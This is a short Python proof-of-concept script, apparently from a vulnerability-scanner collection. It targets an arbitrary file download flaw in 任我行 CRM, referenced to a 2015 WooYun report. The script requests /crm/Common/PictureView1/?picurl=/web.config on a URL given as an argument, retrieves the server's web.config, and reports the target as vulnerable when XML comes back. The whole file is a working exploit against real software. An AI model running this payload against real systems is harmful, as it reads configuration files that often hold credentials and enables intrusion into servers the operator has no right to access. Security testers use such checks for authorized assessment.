#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 任我行crm任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0134737
author: Lucifer
description: 文件Common/PictureView1中,参数picurl存在任意文件下载。
'''
import sys
import requests
import warnings
  
  

class PictureView1_filedownload:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['任我行crm任意文件下载','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/crm/Common/PictureView1/?picurl=/web.config"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = PictureView1_filedownload(sys.argv[1])
    testVuln.run()